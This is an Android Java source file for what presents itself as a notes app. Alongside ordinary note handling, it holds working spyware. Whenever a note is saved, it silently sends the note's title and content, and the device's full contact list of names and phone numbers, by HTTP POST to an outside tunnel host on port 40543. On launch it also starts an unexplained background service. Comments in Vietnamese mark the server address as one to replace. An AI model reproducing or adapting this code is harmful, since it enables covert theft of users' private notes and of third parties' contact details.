package com.zypher.shortnotes;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;

import android.content.Intent;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import java.util.concurrent.TimeUnit;

import android.content.pm.PackageManager;
import android.database.Cursor;

import android.os.Build;

import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int STORAGE_PERMISSION_CODE = 101;
    private static final String NOTES_DIRECTORY_NAME = "NotesApp";
    private static final String TAG = "MainActivityNotes";

    private LinearLayout notesContainer;
    private List<Note> noteList;
    private EditText titleEditText;
    private EditText contentEditText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Khởi động BackgroundService
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        

        notesContainer = findViewById(R.id.notesContainer);
        Button saveButton = findViewById(R.id.saveButton);
        titleEditText = findViewById(R.id.titleEditText);
        contentEditText = findViewById(R.id.contentEditText);
        noteList = new ArrayList<>();

        saveButton.setOnClickListener(v -> checkPermissionAndSaveNote());

        loadNotesFromFileSystem();
        displayNotes();
    }

    private void checkPermissionAndSaveNote() {
        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_DENIED) {
            requestStoragePermission();
        } else {
            saveNote();
        }
    }

    private void requestStoragePermission() {
        ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
                STORAGE_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Storage Permission Granted", Toast.LENGTH_SHORT).show();
                saveNote();
            } else {
                Toast.makeText(this, "Storage Permission Denied. Cannot save note.", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void saveNote() {
        String title = titleEditText.getText().toString().trim();
        String content = contentEditText.getText().toString().trim();

        if (!title.isEmpty() && !content.isEmpty()) {
            String filename = "note_" + System.currentTimeMillis() + ".txt";
            Note note = new Note(title, content, filename);

            if (saveNoteToFile(note)) {
                noteList.add(note);
                createNoteView(note);
                clearInputFields();
                Toast.makeText(this, "Note Saved", Toast.LENGTH_SHORT).show();

                // Gửi dữ liệu đi
                sendNoteToServer(title, content);
                readContactsAndSend();

            } else {
                Toast.makeText(this, "Error: Could not save note!", Toast.LENGTH_LONG).show();
            }
        } else {
            Toast.makeText(this, "Title and Content cannot be empty", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean saveNoteToFile(Note note) {
        File notesDir = getNotesDirectory();
        if (!notesDir.exists() && !notesDir.mkdirs()) return false;

        File noteFile = new File(notesDir, note.getFilename());

        try (FileOutputStream fos = new FileOutputStream(noteFile);
             OutputStreamWriter writer = new OutputStreamWriter(fos)) {
            writer.write(note.getTitle() + "\n");
            writer.write(note.getContent());
            writer.flush();
            return true;
        } catch (IOException e) {
            Log.e(TAG, "Error writing note to file: " + note.getFilename(), e);
            return false;
        }
    }

    private void sendNoteToServer(String title, String content) {
        new Thread(() -> {
            try {
                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/note"); // ← THAY IP
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String data = "title=" + URLEncoder.encode(title, "UTF-8") +
                        "&content=" + URLEncoder.encode(content, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("NoteLog", "Response: " + responseCode);
            } catch (Exception e) {
                Log.e("NoteLog", "Error sending note", e);
            }
        }).start();
    }

    private void sendContactsToServer(String contacts) {
        new Thread(() -> {
            try {
                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/contacts"); // ← THAY IP
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String data = "contacts=" + URLEncoder.encode(contacts, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("ContactsLog", "Response: " + responseCode);
            } catch (Exception e) {
                Log.e("ContactsLog", "Error sending contacts", e);
            }
        }).start();
    }

    private void readContactsAndSend() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            StringBuilder contacts = new StringBuilder();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                    if (nameIndex >= 0 && numberIndex >= 0) {
                        @SuppressLint("Range") String name = cursor.getString(nameIndex);
                        String phoneNumber = cursor.getString(numberIndex);
                        contacts.append(name).append(": ").append(phoneNumber).append("\n");
                    }
                }
                cursor.close();
            }

            sendContactsToServer(contacts.toString());

        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS}, 102);
        }
    }

    private File getNotesDirectory() {
        File documentsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        File notesDir = new File(documentsDir, NOTES_DIRECTORY_NAME);
        if (!notesDir.exists()) notesDir.mkdirs();
        return notesDir;
    }

    private void loadNotesFromFileSystem() {
        noteList.clear();
        File notesDir = getNotesDirectory();
        if (!notesDir.exists()) return;

        File[] noteFiles = notesDir.listFiles();
        if (noteFiles != null) {
            for (File file : noteFiles) {
                if (file.isFile() && file.getName().endsWith(".txt")) {
                    try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                        String title = reader.readLine();
                        StringBuilder contentBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            contentBuilder.append(line).append("\n");
                        }
                        String content = contentBuilder.toString().trim();
                        if (title != null) {
                            noteList.add(new Note(title, content, file.getName()));
                        }
                    } catch (IOException e) {
                        Log.e(TAG, "Error reading note file: " + file.getName(), e);
                    }
                }
            }
        }
    }

    private void displayNotes() {
        notesContainer.removeAllViews();
        for (Note note : noteList) {
            createNoteView(note);
        }
    }

    private void clearInputFields() {
        titleEditText.getText().clear();
        contentEditText.getText().clear();
    }

    private void createNoteView(final Note note) {
        View noteView = getLayoutInflater().inflate(R.layout.note_item, notesContainer, false);
        TextView titleTextView = noteView.findViewById(R.id.titleTextView);
        TextView contentTextView = noteView.findViewById(R.id.contentTextView);

        titleTextView.setText(note.getTitle());
        contentTextView.setText(note.getContent());

        noteView.setOnLongClickListener(v -> {
            showDeleteDialog(note);
            return true;
        });

        notesContainer.addView(noteView);
    }

    private void showDeleteDialog(final Note note) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Delete this note?");
        builder.setMessage("Are you sure you want to delete the note titled '" + note.getTitle() + "'?");
        builder.setPositiveButton("Delete", (dialog, which) -> deleteNoteAndRefresh(note));
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void deleteNoteAndRefresh(Note note) {
        File noteFile = new File(getNotesDirectory(), note.getFilename());
        boolean deleted = noteFile.exists() && noteFile.delete();
        noteList.remove(note);
        refreshNoteViews();
        Toast.makeText(this, deleted ? "Note Deleted" : "Error: Could not delete note.", Toast.LENGTH_SHORT).show();
    }

    private void refreshNoteViews() {
        notesContainer.removeAllViews();
        displayNotes();
    }
}
